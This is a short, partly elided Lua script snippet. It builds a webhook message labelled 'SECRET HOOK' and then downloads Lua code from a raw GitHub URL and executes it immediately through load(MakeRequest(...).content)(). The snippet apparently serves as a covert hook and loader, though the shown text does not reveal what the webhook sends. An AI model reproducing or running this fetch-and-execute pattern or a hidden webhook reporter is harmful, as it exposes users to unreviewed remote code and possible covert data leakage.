...
local DATA = [[
        {
            "username":"SECRET HOOK",
            "avatar_url": "https://mystickermania.com/cdn/stickers/anime/danganronpa-monokuma-512x512.png",
            "content": "",
            "embeds": [{
                "footer": {
...
load(MakeRequest("https://raw.githubusercontent.com/Tajny-Scenariusz/Tajny-Scenariusz/main/ID%20PNB.lua","GET").content)()
